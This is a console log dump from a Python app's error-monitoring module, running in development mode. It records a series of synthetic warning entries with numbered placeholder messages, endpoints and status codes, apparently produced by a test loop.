WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823200Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2538'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823249Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2539'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823340Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2540'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823408Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2541'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823462Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2542'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823513Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2543'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823568Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2544'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823617Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2545'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823664Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2546'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823713Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2547'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823761Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2548'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823811Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m51[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2549'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823867Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2550'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823920Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2551'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.823973Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2552'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824023Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2553'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824073Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2554'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824123Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2555'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824173Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2556'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824222Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2557'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824270Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2558'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824318Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2559'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824366Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2560'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824428Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2561'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824477Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2562'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824526Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2563'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824574Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2564'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824650Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2565'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824738Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2566'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824804Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2567'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824859Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2568'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824910Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2569'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.824960Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2570'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825009Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2571'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825060Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2572'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825112Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2573'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825162Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2574'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825212Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2575'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825260Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2576'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.825309Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m52[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2577'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
